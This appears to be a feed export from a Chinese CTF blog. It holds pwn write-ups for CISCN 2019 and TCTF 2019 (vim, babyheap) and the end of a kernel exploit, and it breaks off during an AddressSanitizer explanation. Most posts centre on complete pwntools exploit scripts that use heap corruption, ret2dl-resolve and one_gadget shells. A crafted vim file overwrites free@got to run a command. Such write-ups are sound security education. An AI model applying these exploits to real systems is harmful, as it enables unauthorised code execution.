r.recvuntil("$ ")def upload(): p = log.progress("Upload") with open("pwn", "rb") as f: data = f.read() encoded = base64.b64encode(data) r.recvuntil("$ ") for i in range(0, len(encoded), 300): p.status("%d / %d" % (i, len(encoded))) exec_cmd("echo \"%s\" &gt;&gt; benc" % (encoded[i:i+300])) exec_cmd("cat benc | base64 -d &gt; bout") exec_cmd("chmod +x bout") p.success()def exploit(r): compile() upload() r.interactive() returnif __name__ == "__main__": if len(sys.argv) &gt; 1: session = ssh(USER, HOST, PORT, PW) r = session.run("/bin/sh") exploit(r) else: r = process("./startvm.sh") print util.proc.pidof(r) pause() exploit(r) 参考资料 https://bbs.pediy.com/thread-226696.htm https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/ https://hardenedlinux.github.io/system-security/2016/05/23/kernel_self_protection.html https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/ https://xz.aliyun.com/t/2054 https://kileak.github.io/ctf/2019/xctf-hackme/ http://p4nda.top/2018/10/11/ciscn-2017-babydriver/ https://github.com/pwning/public-writeup/tree/master/0ctf2017/knote]]></content>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>pwn</tag>
        <tag>smep</tag>
        <tag>smap</tag>
        <tag>ret2usr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019全国大学生信息安全竞赛(CISCN)初赛解题赛Pwn WriteUp]]></title>
    <url>%2F2019%2F04%2F22%2Fciscn-2019-preliminaries%2F</url>
    <content type="text"><![CDATA[Pwn相对来说还是比较简单的，和舍友一起AK了。 your_pwn数组越界，可对栈进行任意修改，将函数的返回地址改至one_gadget即可。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# coding=utf-8from pwn import *def do_one(p, idx): p.sendlineafter('input index\n', str(idx)) p.recvuntil('now value(hex) ') recv = '0x' + p.recvuntil('\n', drop=True) #if recv != '0x0': # print idx #print recv p.sendlineafter('input new value\n', str(int(recv, 16))) return int(recv, 16)def write_one(p, idx, num): p.sendlineafter('input index\n', str(idx)) p.recvuntil('now value(hex) ') recv = '0x' + p.recvuntil('\n', drop=True) p.sendlineafter('input new value\n', str(num)) return int(recv, 16) def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' #context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' if DEBUG == 1: gdb.attach(p) raw_input() p.sendlineafter('name:', 'sunichi') libc_addr = [] for i in range(6): libc_addr.append(do_one(p, 0x7ffc0ffeae68 + i - (0x7ffc0ffead40 - 0x150))) start_addr = 0 for i in range(6): print hex(libc_addr[i]) start_addr += (libc_addr[i] &amp; 0xff) &lt;&lt; (i * 8) libc.address = start_addr - (0x7fad3b311830 - 0x00007fad3b2f1000) for i in range(41-6-6): do_one(p, 0) print hex(libc.address + 0xf1147) for i in range(6): print hex(((libc.address + 0xf1147) &gt;&gt; (i * 8)) &amp; 0xff) write_one(p, 0x7ffeb2b1b148 + i - (0x7ffeb2b1b140 - 0x150), ((libc.address + 0xf1147) &gt;&gt; (i * 8)) &amp; 0xff) print hex(libc.address) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' daily申请chunk的时候没有清空，导致地址泄漏。free的时候没有对数组越界进行检查，在获得堆地址后，可以计算偏移直接越界并进行fastbin attack（在堆中特定位置写入要double free的chunk的地址）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113# coding=utf-8from pwn import *def add(p, size, content): p.sendlineafter('Your choice:', str(2)) p.sendafter('length of daily:', str(size)) p.sendafter('you daily\n', content)def show(p): p.sendlineafter('Your choice:', str(1))def delete(p, idx): p.sendlineafter('Your choice:', str(4)) p.sendlineafter('Please enter the index of daily:', str(idx))def change(p, idx, content): p.sendlineafter('Your choice:', str(3)) p.sendlineafter('Please enter the index of daily:', str(idx)) p.sendafter('Please enter the new daily\n', content) def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' #context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' add(p, 0x100, 'sunichi') #0 add(p, 0x68, 'sunichi') #1 add(p, 0x68, 'sunichi') #2 add(p, 0x68, 'sunichi') #3 delete(p, 0) add(p, 0x100, 's') show(p) p.recvuntil('0 : ') recv = p.recv(6) + '\x00\x00' if DEBUG == 1: libc.address = u64(recv) - (0x00007f2a09751b73 - 0x00007f2a0938d000) else: libc.address = u64(recv) - (0x00007f2a09751b73 - 0x00007f2a0938d000) delete(p, 1) delete(p, 2) add(p, 0x68, 's') #1 show(p) p.recvuntil('1 : ') recv = p.recvuntil('3 : ', drop=True) recv = recv.ljust(8, '\x00') heap_base = u64(recv) - (0x0000000001bba173 - 0x1bba000) change(p, 1, 'a' * 8 * 3 + p64(heap_base + 0x120)) delete(p, 1) #gdb.attach(p, gdbscript='b *0x400c39') #raw_input() delete(p, (heap_base + 0x1a0 - 0x602060) / 0x10) add(p, 0x68, p64(libc.symbols['__malloc_hook'] - 0x13)) add(p, 0x68, '\n') add(p, 0x68, '\n') add(p, 0x68, '\x00\x00\x00' + p64(libc.address + 0xf02a4)) delete(p, 1) delete(p, 4) print hex(libc.address) print hex(heap_base) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' baby_pwn32位典型的ret2dl-resolve的题目，改改以前脚本的参数就行了。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102# coding=utf-8from pwn import *def pwn(): BIN_PATH = './pwn' DEBUG = 0 #context.arch = 'amd64' context.arch = 'i386' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug' if DEBUG == 1: gdb.attach(p) raw_input() offset = 44 ppp_ret = 0x080485d9 pop_ebp_ret = 0x080485db leave_ret = 0x08048448 stack_size = 0x800 bss_addr = 0x0804a040 base_stage = bss_addr + stack_size read_plt = elf.plt['read'] payload = 'A' * offset payload += p32(read_plt) payload += p32(ppp_ret) payload += p32(0) payload += p32(base_stage) payload += p32(100) payload += p32(pop_ebp_ret) payload += p32(base_stage) payload += p32(leave_ret) p.sendline(payload) cmd = "/bin/sh" plt_0 = 0x08048380 # objdump -d -j .plt bof rel_plt = 0x804833c # objdump -s -j .rel.plt bof index_offset = (base_stage + 28) - rel_plt alarm_got = elf.got['alarm'] dynsym = 0x080481DC dynstr = 0x0804827C fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + align index_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = (index_dynsym &lt;&lt; 8) | 0x7 fake_reloc = p32(alarm_got) + p32(r_info) st_name = (fake_sym_addr + 16) - dynstr fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) payload2 = 'AAAA' payload2 += p32(plt_0) payload2 += p32(index_offset) payload2 += 'AAAA' payload2 += p32(base_stage + 80) payload2 += 'aaaa' payload2 += 'aaaa' payload2 += fake_reloc # (base_stage+28)的位置 payload2 += 'B' * align payload2 += fake_sym # (base_stage+36)的位置 payload2 += "system\x00" payload2 += 'A' * (80 - len(payload2)) payload2 += cmd + '\x00' payload2 += 'A' * (100 - len(payload2)) p.send(payload2) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x080485db : pop ebp ; ret0x080485d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret0x0804837d : pop ebx ; ret0x080485da : pop edi ; pop ebp ; ret0x080485d9 : pop esi ; pop edi ; pop ebp ; ret0x080481ab : ret0x0804845e : ret 0xeac1''' Double对于连续的相同的内容，程序不会重新申请新的chunk而是共用，但free的时候并没有检查是否还有info在使用，导致uaf。通过fastbin attack即可信息泄露和getshell。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# coding=utf-8from pwn import *def add(p, content): p.sendlineafter('&gt; ', str(1)) p.sendafter('Your data:\n', content)def show(p, idx): p.sendlineafter('&gt; ', str(2)) p.sendlineafter('Info index: ', str(idx))def change(p, idx, content): p.sendlineafter('&gt; ', str(3)) p.sendlineafter('Info index: ', str(idx)) p.send(content)def delete(p, idx): p.sendlineafter('&gt; ', str(4)) p.sendlineafter('Info index: ', str(idx))def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' add(p, 'a' * (0xff) + '\n') #0 add(p, 'a' * (0xff) + '\n') #1 delete(p, 0) show(p, 1) recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7fece5e8eb78 - 0x00007fece5aca000) add(p, 'a' * (0x67) + '\n') #2 add(p, 'a' * (0x67) + '\n') #3 add(p, 'a' * (0x1f) + '\n') #4 add(p, 'b' * (0x67) + '\n') #5 delete(p, 2) delete(p, 5) delete(p, 3) payload = p64(libc.symbols['__malloc_hook'] - 0x13) payload = payload.ljust(0x67, 'a') + '\n' add(p, payload) add(p, 'c' * (0x67) + '\n') add(p, 'd' * (0x67) + '\n') add(p, 'e' * (0x47) + '\n') add(p, 'e' * (0x47) + '\n') payload = 'a'*3 + p64(libc.address + 0xf1147) payload = payload.ljust(0x67, 'a') + '\n' add(p, payload) print hex(libc.address) delete(p, 8) delete(p, 9) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''' bmstcache，UAF，修改stdout来泄漏地址，劫持free@got。舍友做的，就不贴脚本了。 Virtual在save和load的时候没有检查操作数是否导致地址越界，从而能够前后向任意偏移save和load。通过save将用户输入stack data的数据结构的指针指到free@got后，先打远程，通过泄漏的地址可以获取libc的版本。然后用同样思路，只不过多一步操作（push add pop）将free@got的内容修改为one_gadget。输入的时候多输入一个数据使得free@got处的数据能够被push。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# coding=utf-8from pwn import *def pwn(): BIN_PATH = './pwn' DEBUG = 0 context.arch = 'amd64' if DEBUG == 1: p = process(BIN_PATH) elf = ELF(BIN_PATH) context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('', ) elf = ELF(BIN_PATH) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' #gdb.attach(p, gdbscript='b *0x401B42') p.sendlineafter('Your program name:\n', 'sunichi') payload = 'push push push save push add pop' p.sendlineafter('Your instruction:\n', payload) print hex(libc.symbols['free']) payload = str(0xf1147 - libc.symbols['free']) + ' ' + str(elf.got['free']) + ' ' + str((0xffffffffffffffff - 1663) / 8) + ' ' + '1 ' p.sendlineafter('Your stack data:\n', payload) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints: rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''']]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCTF 2019 vim]]></title>
    <url>%2F2019%2F04%2F04%2FTCTF-2019-vim%2F</url>
    <content type="text"><![CDATA[自定义的加解密方法存在漏洞。 0x00 源代码刨析key设置为恒为字符串a。 1234// to avoid interactive step, without loss of generalityp1 = alloc(8);p1[0] = 'a';p1[1] = NUL; cryptstate_T结构体： 12345678910/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T; init函数，其中主要做的是计算cryptstate_T结构体的key，可以在此函数下断点验证传入的key是否为”a”。 1234567891011121314151617181920crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; char_u *p; perm_state_T *ps; ps = (perm_state_T *)alloc(sizeof(perm_state_T)); ps-&gt;key = 0; state-&gt;method_state = ps; for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 解密函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; perm_state_T *ps = state-&gt;method_state; size_t i; if (len&lt;=4) &#123; for (i = 0; i &lt; len; ++i) to[i] = from[i]; return; &#125; unsigned int iv; for (i = 0; i &lt; 4; ++i) &#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i]; &#125; ps-&gt;orig_size = len-4; ps-&gt;size = ps-&gt;orig_size; while (!is_prime(ps-&gt;size)) ps-&gt;size++; ps-&gt;shift = ps-&gt;key % (len-4); if (ps-&gt;shift &gt; 0) ps-&gt;buffer = alloc(ps-&gt;shift); ps-&gt;step = ps-&gt;key ^ iv; if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++; ps-&gt;cur_idx = 0; /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; for (i = 4+ps-&gt;shift; i &lt; len; ++i) to[i-ps-&gt;shift] = to[i]; for (i = 0; i &lt; ps-&gt;shift; ++i) to[len-ps-&gt;shift+i] = ps-&gt;buffer[i]; if (ps-&gt;shift &gt; 0) vim_free(ps-&gt;buffer);&#125; 需要知道IV在头文件中的位置，漏洞主要在步骤1中： 12345678910111213141516171819202122232425262728293031/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ...&#125; 这里没有检查ps-&gt;cur_idx的值，导致可以控制其为负数，造成堆的前向溢出。 from是vim打开的文件。ps-&gt;step可以通过 1234567891011unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125;// ...ps-&gt;step = ps-&gt;key ^ iv;if (ps-&gt;step % ps-&gt;size == 0) ps-&gt;step++;ps-&gt;cur_idx = 0; 控制。 如果能改写ps-&gt;buffer的值，就能进一步利用 123/* Step 2: Inverse of Addition */for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; 达到任意地址写的目的。 0x01 Debug it生成脚本： 12345678910111213141516def main(): payload = 'VimCrypt~04!' payload += 'aaaa' payload += 'bbbb' payload += 'cccc' payload += 'dddd' payload += 'eeee' payload += 'ffff' payload += 'gggg' payload += 'hhhh' with open('exp', 'wb') as f: f.write(payload)if __name__ == '__main__': main() 设置参数和断点： crypt_perm_init()断点： 12345678910111213141516crypt_perm_init( cryptstate_T *state, char_u *key, char_u *salt UNUSED, int salt_len UNUSED, char_u *seed UNUSED, int seed_len UNUSED)&#123; // ... ps-&gt;key = 0; // ... for (p = key; *p != NUL; ++p) &#123; ps-&gt;key = 131*ps-&gt;key + *p; &#125;&#125; 可以发现RSI指向的key为字符串”aNUL”，因此ps-&gt;key的值为0x61。 12345crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to) 通过调试可以发现from（图中的rsi指向的数据）即为去除maigc的剩余部分输入内容，也就是说IV即输入文件除去魔术数的前四字节。 123456unsigned int iv;for (i = 0; i &lt; 4; ++i)&#123; to[i] = from[i]; iv = (iv&lt;&lt;8) + from[i];&#125; 为了让ps-&gt;step为-1，ps-&gt;key就要为-1^iv。 1ps-&gt;step = ps-&gt;key ^ iv; 由上图可以知道rax的值为0x900000即ps变量，rcx的值为0x900030即to参数。它们紧挨在一起，使得to的向前溢出能够覆盖ps变量，从而达到改写ps-&gt;buffer的目的。 1234567891011121314151617181920212223242526272829303132333435/* The state of encryption, referenced by cryptstate_T. */typedef struct &#123; int key; int shift; int step; int orig_size; int size; int cur_idx; char_u *buffer;&#125; perm_state_T;crypt_perm_decode( cryptstate_T *state, char_u *from, size_t len, char_u *to)&#123; // ... /* Step 1: Inverse of Multiplication */ i = 4; while (i &lt; len) &#123; if (ps-&gt;cur_idx &lt; ps-&gt;orig_size) &#123; to[ps-&gt;cur_idx+4] = from[i]; i++; &#125; ps-&gt;cur_idx = (ps-&gt;cur_idx+ps-&gt;step)%ps-&gt;size; &#125; // ... /* Step 2: Inverse of Addition */ for (i = 0; i &lt; ps-&gt;shift; ++i) ps-&gt;buffer[i] = to[i+4]; // ...&#125; 但是代码从to[i+4]处开始获得数据写入ps-&gt;buffer，因此需要想办法向to[i+4]之后的地址写入数据。 观察到，ps-&gt;cur_idx是可以被覆盖最高字节的，且在计算的时候会模上from的长度，所以覆盖高字节后，ps-&gt;cur_idx是一个很大的正数，通过求模可将写入to的位置移动到正向方向来进行回写。 0x02 Pwn it在程序中，有一处执行shell的地方： 可以执行rax/rcx的所指向的命令。 crypt_perm_decode()在最后执行了vim_free(ps-&gt;buffer)，而在vim_free()中，call free的时候，rax正是保存了ps-&gt;buffer的地址，因此在修改free@got的同时通过向ps-&gt;buffer写入cat flag即可获取flag。 exp生成脚本如下： 1234567891011121314151617181920212223from pwn import *import structdef main(): elf = ELF('./vim') payload = 'VimCrypt~04!' payload += struct.pack("&gt;i", -1 ^ 0x61) # iv payload += 'aaaaa' payload += p64(0x61)[::-1] payload += 'cccccccc' payload += p64(elf.got['free'] - 4 - 8)[::-1] payload += 'bbbbbbbb' payload += 'cccccc\x00\x00' payload += '\x00\x00\x00\x4c\x91\x63\x00\x00' payload += '\x00\x00galf t' payload += 'ac'.ljust(8, '\x00') with open('exp', 'wb') as f: f.write(payload)if __name__ == '__main__': main()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>tctf</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TCTF 2019 babyheap]]></title>
    <url>%2F2019%2F03%2F27%2FTCTF-2019-babyheap%2F</url>
    <content type="text"><![CDATA[程序中的唯一漏洞就是在写入数据时发生了off-by-null。 程序中使用calloc函数作为分配堆块的函数，需要注意该函数不使用tcache，直接调用_int_malloc。 1234567891011121314void *__libc_calloc (size_t n, size_t elem_size)&#123; mstate av; mchunkptr oldtop, p; INTERNAL_SIZE_T bytes, sz, csz, oldtopsize; void *mem; unsigned long clearsize; unsigned long nclears; INTERNAL_SIZE_T *d; // ... mem = _int_malloc (av, sz); // ...&#125; 一开始注意到程序分配了很大一块无用的堆块： 123if ( mmap(addr, 0x1000uLL, 3, 34, -1, 0LL) != addr ) exit(-1);malloc(0x1F000uLL); 这使得top chunk变得非常小了。因此就想到了通过耗尽top chunk来拿到unsorted bin的做法。 第一步先将需要用到的对应大小的fastbin对应的tcache填满，以获得fastbin，并且在分配的过程中不断向top chunk的size溢出\x00以更快的消耗其剩余大小。 在其中适当的位置释放空间连续的fastbin，当top chunk的剩余大小不足以满足分配申请时，将会调用malloc_consolidate函数对fastbin中的空闲chunk进行合并，并放入small bin中，由于申请了空间，small bin被分割后放入unsorted bin。利用常规的off by null和堆块重叠来泄漏地址并供后续fastbin attack。 在进行fastbin attack时，将fd指针指到main_arena中，先把top chunk指到堆的起始位置，即tcache entry处，获取该处内存以用来不断清空tcache计数。随后将top chunk指到stdout附近，通过不断申请、释放、清空tcache计数（避免chunk被放入fastbin而无法使用top chunk）的方法消耗top chunk使其移动到__free_hook附近，并将其改写成one_gadget，通过触发free来getshell。 exp如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190from pwn import *def add(p, size): p.sendlineafter('Command: ', str(1)) p.sendlineafter('Size: ', str(size)) def update(p, idx, size, content): p.sendlineafter('Command: ', str(2)) p.sendlineafter('Index: ', str(idx)) p.sendlineafter('Size: ', str(size)) p.sendafter('Content: ', content)def delete(p, idx): p.sendlineafter('Command: ', str(3)) p.sendlineafter('Index: ', str(idx))def view(p, idx): p.sendlineafter('Command: ', str(4)) p.sendlineafter('Index: ', str(idx))def pwn(): #p = process('./babyheap') p = remote('111.186.63.20', 10001) elf = ELF('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] for i in range(7): add(p, 0x28) update(p, i, 0x28, 'a' * 0x28) for i in range(7): delete(p, i) for i in range(7): add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) for i in range(7): delete(p, i) for i in range(8): add(p, 0x48) update(p, i, 0x48, 'a' * 0x48) for i in range(7): delete(p, i) # 7 for i in range(4): # 0 ~ 3 add(p, 0x38) update(p, i, 0x38, 'a' * 0x38) add(p, 0x38) # 4 payload = p64(0) * 4 + p64(0x100) + p64(0x60) + p64(0) update(p, 4, 0x38, payload) add(p, 0x48) # 5 update(p, 5, 0x48, 'a' * 0x48) add(p, 0x38) # 6 update(p, 6, 0x38, 'a' * 0x38) for i in range(5): # 0 ~ 4 delete(p, i) add(p, 0x58) # 0 add(p, 0x58) # 1 add(p, 0x28) # 2 update(p, 2, 0x28, 'a' * 0x28) delete(p, 5) add(p, 0x38) # 3 add(p, 0x38) # 4 add(p, 0x38) # 5 add(p, 0x38) # 8 delete(p, 3) delete(p, 4) add(p, 0x28) # 3 add(p, 0x48) # 4 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' libc.address = u64(recv) - (0x7f8b3cdeaca0 - 0x00007f8b3cc06000) add(p, 0x48) # 9 target_address = libc.address + (0x7fd5d1e8bc55 - 0x7fd5d1ca7000) # 5 - 9 is same delete(p, 4) #4 delete(p, 9) #9 delete(p, 2) #2 view(p, 5) p.recvuntil('[5]: ') recv = p.recv(6) + '\x00\x00' heap_address = u64(recv) print hex(target_address) update(p, 5, 0x8, p64(target_address)) add(p, 0x48) # 2 - 5 is same add(p, 0x48) # 4 tcache_entry = heap_address - (0x563db82df850 - 0x563db82c0000) payload = '\x00\x00\x00' + p64(0) * 7 + p64(tcache_entry) update(p, 4, len(payload), payload) add(p, 0x58) # 9 add(p, 0x28) # 10 add(p, 0x28) # 11 add(p, 0x28) # 12 update(p, 12, 0x28, '\x00' * 0x28) delete(p, 10) delete(p, 11) delete(p, 9) payload = '\x00\x00\x00' + p64(0) * 7 + p64(libc.address + 0x7ffff7fc3850 - 0x00007ffff7dde000) update(p, 4, len(payload), payload) count = [9, 10, 11, 13, 14, 15] for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) for j in range(6): for i in range(6): add(p, 0x58) # 9 for i in range(6): delete(p, count[i]) update(p, 12, 0x28, '\x00' * 0x28) add(p, 0x58) # 9 update(p, 9, 8, 'sunichi') add(p, 0x58) # 10 add(p, 0x58) # 11 payload = p64(0) + p64(libc.address + 0x103f50) update(p, 11, len(payload), payload) print hex(heap_address) print hex(libc.address) print hex(target_address) #get shell delete(p, 9) #gdb.attach(p) p.interactive() p.close()if __name__ == '__main__': pwn()'''0x50186 execve("/bin/sh", rsp+0x40, environ)constraints: rcx == NULL0x501e3 execve("/bin/sh", rsp+0x40, environ)constraints: [rsp+0x40] == NULL0x501ef execve("/bin/sh", rsi, [rax])constraints: [rsi] == NULL || rsi == NULL [[rax]] == NULL || [rax] == NULL0xdf39f execve("/bin/sh", rcx, [rbp-0x70])constraints: [rcx] == NULL || rcx == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xdf3a3 execve("/bin/sh", rcx, rdx)constraints: [rcx] == NULL || rcx == NULL [rdx] == NULL || rdx == NULL0xdf3a6 execve("/bin/sh", rsi, rdx)constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL0x103f50 execve("/bin/sh", rsp+0x70, environ)constraints: [rsp+0x70] == NULL''']]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2019</tag>
        <tag>heap</tag>
        <tag>tctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Learn Address Sanitizer with TCTF 2019 babyaegis]]></title>
    <url>%2F2019%2F03%2F27%2FLearn-Address-Sanitizer-with-TCTF-2019-babyaegis%2F</url>
    <content type="text"><![CDATA[比较有趣又能学到新知识的一题。 参考论文： AddressSanitizer: A Fast Address Sanity Checker 0x00 简介AddressSanitizer(ASan)是一个内存错误检测工具，主要能够检测内存的非法读写、UAF等。 ASan通过Shadow Byte来记录内存空间的状态，每8字节有9个状态，分别标记从低到高Good Byte的数量。全8字节无问题为0，前7～1字节无问题分别为7～1，全部有问题标记为-1。Shadow Byte的位置通过如下计算方式得到： 1Shadow = (Addr &gt;&gt; 3) + Offset 64位时，Offset为0x7fff8000；32位时，Offset为0x20000000。使用的插桩代码如下： 1234567891011121314byte *shadow_address = MemToShadow(address);byte shadow_value = *shadow_address;if (shadow_value) &#123; if (SlowPathCheck(shadow_value, address, kAccessSize)) &#123; ReportError(address, kAccessSize, kIsWrite); &#125;&#125;// Check the cases where we access first k bytes of the qword// and these k bytes are unpoisoned.bool SlowPathCheck(shadow_value, address, kAccessSize) &#123; last_accessed_byte = (address &amp; 7) + kAccessSize - 1; return (last_accessed_byte &gt;= shadow_value);&#125; 判断连续8字节是否可用： 123456*a = NULL; // give a something... or b = *achar *shadow = (a &gt;&gt; 3) + Offset;if (*shadow) &#123; ReportError(a);&#125; N字节是否可用（N=1, 2, 4）： 12345char *shadow = (a &gt;&gt; 3) + Offset;if ( *shadow &amp;&amp; *shadow &lt;= ( (a &amp; 7) + N - 1) ) &#123; ReportError(a);&#125; ASan还具有一个特性，被释放的块不会马上被重复使用，有一个默认阈值256MB，当再被释放256MB的内存空间之后，之前被释放的内存才会被重用。 A use-after-free may not be detected if a large amount of memory has been allocated and deallocated between the “free“ and the following use. Quarantine size (default: 256MB). This value controls the ability to find heap-use-after-free bugs (see Section 3.5). It does not affect performance ASan中堆块的header： 1234567891011121314151617181920struct ChunkHeader &#123; // 1-st 8 bytes. u32 chunk_state : 8; // Must be first. u32 alloc_tid : 24; u32 free_tid : 24; u32 from_memalign : 1; u32 alloc_type : 2; u32 rz_log : 3; u32 lsan_tag : 2; // 2-nd 8 bytes // This field is used for small sizes. 